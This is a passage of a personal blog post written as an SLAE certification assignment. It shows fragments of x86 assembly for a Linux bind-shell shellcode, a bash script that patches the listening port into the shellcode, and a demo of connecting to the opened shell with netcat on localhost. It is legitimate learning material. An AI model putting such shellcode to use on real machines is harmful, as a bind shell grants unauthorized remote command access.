<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; Set up args for 'Bind'</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0xaaaa</span><span class="c">; Marker bytes for compile script</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="p">...</span>
</code></pre>
</div>

<h3 id="script">script</h3>

<p>I wont go over the entire script in this post, as the script is commented and self-explanatory, but the actual replacement is done like this:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>shellcode <span class="o">=</span> 
<span class="nv">porthex</span><span class="o">=</span><span class="se">\\</span>x<span class="nv">$lb</span><span class="se">\\</span>x<span class="nv">$hb</span>
<span class="nv">marker</span><span class="o">=</span><span class="s2">"</span><span class="se">\\\x</span><span class="s2">aa</span><span class="se">\\\x</span><span class="s2">aa"</span>

<span class="nb">echo</span> <span class="s2">"[---] Replacing the port to </span><span class="nv">$port</span><span class="s2">"</span>
<span class="nv">shellcode</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">shellcode</span><span class="p">/</span><span class="nv">$marker</span><span class="p">/</span><span class="nv">$porthex</span><span class="k">}</span><span class="s2">"</span>
</code></pre>
</div>

<p>Execute the generated shellcode-wrapper and connect to the specified port with netcat:</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>./shellcode-bind-shell 1337
Shellcode length: 102
</code></pre>
</div>
<p>(in another terminal:)</p>
<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>nc localhost 1337
<span class="nb">pwd</span> 
/home/rtmcx
ls
Desktop
Downloads
shellcode-bind-shell
</code></pre>
</div>
<p>It works!</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

      <footer class="entry-meta">
        <span class="entry-tags"><a href="https://rtmcx.github.io/tags/#asm" title="Pages tagged asm" class="tag"><span class="term">asm</span></a><a href="https://rtmcx.github.io/tags/#code" title="Pages tagged code" class="tag"><span class="term">code</span></a><a href="https://rtmcx.github.io/tags/#slae" title="Pages tagged slae" class="tag"><span class="term">slae</span></a></span>
        <span>Updated on <span class="entry-date date updated"><time datetime="2017-03-23 19:27:45 +0000">March 23, 2017</time></span></span>
        <span class="author vcard"><span class="fn">rtmcx</span></span>
        <div class="social-share">
  <ul class="socialcount socialcount-small inline-list">
    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://rtmcx.github.io/SLAE-Assignment-1/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://rtmcx.github.io/SLAE-Assignment-1/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
    <li class="googleplus"><a href="https://plus.google.com/share?url=https://rtmcx.github.io/SLAE-Assignment-1/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
  </ul>
</div><!-- /.social-share -->
      </footer>
    </div><!-- /.entry-content -->
    
    <div class="read-more">
  
    <div class="read-more-header">
      <a href="https://rtmcx.github.io/SLAE/" class="read-more-btn">Read More</a>
    </div><!-- /.read-more-header -->
    <div class="read-more-content">
      <h3><a href="https://rtmcx.github.io/SLAE-Assignment-7/" title="SLAE Assignment 7">SLAE Assignment 7</a></h3>
      <p>SLAE Assignment 7 - Custom crypter <a href="https://rtmcx.github.io/SLAE-Assignment-7/">Continue reading</a></p>
    </div><!-- /.read-more-content -->
  
  <div class="read-more-list">
    
      <div class="list-item">
        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-6/" title="SLAE Assignment 6">SLAE Assignment 6</a></h4>
        <span>Published on May 09, 2017</span>
      </div><!-- /.list-item -->
    
      <div class="list-item">
        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" title="SLAE Assignment 5 (3/3)">SLAE Assignment 5 (3/3)</a></h4>
        <span>Published on May 06, 2017</span>
      </div><!-- /.list-item -->
    
  </div><!-- /.read-more-list -->
</div><!-- /.read-more -->
  </article>
</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>



	        

</body>
</html>
